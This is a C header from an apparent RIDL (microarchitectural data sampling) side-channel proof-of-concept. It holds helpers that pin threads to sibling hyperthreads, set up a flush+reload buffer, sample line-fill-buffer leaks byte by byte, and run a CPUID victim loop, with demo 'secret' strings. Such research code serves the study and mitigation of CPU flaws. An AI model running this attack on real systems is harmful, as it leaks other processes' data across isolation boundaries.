#ifndef RIDL_UTILS_H
#define RIDL_UTILS_H

#include <stdio.h>
#include <fcntl.h>
#include <time.h>
#include <stdint.h>
#include <pthread.h>
#include <string.h>
#include "../primitives/basic_primitives.h"

#ifdef TSX_AVAILABLE
#define READ_SUCCESS_THRESHOLD 1000
#define REPS 5000
#else
#define READ_SUCCESS_THRESHOLD 3000
#define REPS 20000
#endif


#define TIMES_TEN(X) X X X X X X X X X X
#define CPUID_BRAND_STRING_1_PRIMITIVE 0x80000002
#define CPUID_BRAND_STRING_3_PRIMITIVE 0x80000004
#define CPUID_THERMAL_STRING_PRIMITIVE 0x6

int _page_size = 0x1000;
int attacker_cpu1 = 3, attacker_cpu2 = 7, offcore_cpu = 1, pid = 0, pid2 = 0;

int vector_hits[64][256];
uint8_t vector[64];
uint8_t byte_32;


inline uint64_t time_convert(struct timespec *spec) { return (1000000000 * (uint64_t) spec->tv_sec) + spec->tv_nsec; }

int sample_string_count = 3;
char *sample_strings[] = {
        "_The implications are worrisome.",
        "_This string is very secret. Don't read it!",
        "_You should not be able to read this.",
};

void set_processor_affinity(int core_id) {
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(core_id, &cpuset);

    pthread_t current_thread = pthread_self();
    pthread_setaffinity_np(current_thread, sizeof(cpu_set_t), &cpuset);
}

void get_same_core_cpus(int *a, int *b) {
    FILE *cpuinfo_fd = fopen("/proc/cpuinfo", "r");
    char *read_buffer = NULL;
    int empty = 0, core_num = 0;
    ssize_t len = 1024;
    while (getline(&read_buffer, &len, cpuinfo_fd)) {
        if (strlen(read_buffer) <= 1) {
            if (empty) break;
            empty = 1;
        } else empty = 0;
        if (strncmp(read_buffer, "core id", 7))
            continue;
        core_num++;
    }
    *a = (core_num / 2) - 1;
    *b = core_num - 1;
    fflush(stdout);
    fclose(cpuinfo_fd);
}

uint8_t* allocate_flush_reload_buffer(){
    uint8_t *mem =
            mmap(NULL, _page_size * 257, PROT_READ | PROT_WRITE,
                 MAP_ANONYMOUS | MAP_PRIVATE | MAP_POPULATE | MAP_HUGETLB, -1, 0) + 1;
    memset(mem, 0xFF, _page_size * 256);
    return mem;
}

void fill_result_buffer(char* buffer, int start, int end){
    for (int k = start; k < end; k++) {
        int max = 0, max_i = -1;
        for (int i = 1; i < 256; i++) {
            if (vector_hits[k][i] > max) {
                max_i = i;
                max = vector_hits[k][i];
            }
        }

        if (max > (float) REPS / READ_SUCCESS_THRESHOLD) {
            buffer[k] = (char) max_i;
        } else {
            buffer[k] = '*';
        }
    }
}

void vector_read(void *mem, int _reps, char* buffer, int start, int end, int fill_complete_buffer) {
    set_processor_affinity(attacker_cpu1);
    memset(vector, 0, sizeof(vector[0]) * 64);
    memset(vector_hits, 0, sizeof(vector_hits[0][0]) * 256 * 64);
    int reps = _reps;
    while (reps--) {
        lfb_partial_vector_read(mem, vector, start, end);
        for (int i = start; i < end; i++) {
            int value = (int) vector[i];
#ifndef TSX_AVAILABLE
            if(value < 0xfe)
#endif
            vector_hits[i][value & 0xFF]++;
        }
    }
    if(fill_complete_buffer) fill_result_buffer(buffer, 0, 64);
    else fill_result_buffer(buffer, start, end);
}

// Primes a segment of the staging buffer with a known cpuid value,
// then returns the first byte of that segment
uint8_t prime_and_get_cpuid(uint32_t leaf){
    uint32_t ret;
    asm volatile(
            "mov %1, %%eax\n"
            "cpuid\n"
    : "=a" (ret)
    : "r" (leaf));
    return (uint8_t)(ret & 0xFF);
}

// Checks whether a specific position on the staging buffer contains a known reference value
int staging_buffer_byte_changed(void* mem, int pos, uint8_t reference){
    int success = 0;
    for(int i = 0; i < REPS*3; i++){
        success += lfb_read_basic(mem, pos) == reference;
    }
    return success == 0;
}

inline void *victim_cpuid(uint32_t leaf, int cpu) {
    set_processor_affinity(cpu);
    while (1) {
        asm volatile(
        "mov %0, %%eax\n"
        "cpuid\n"
        ::"r"(leaf)
        : "eax", "ebx", "ecx", "edx");
    }
}

#endif //RIDL_UTILS_H
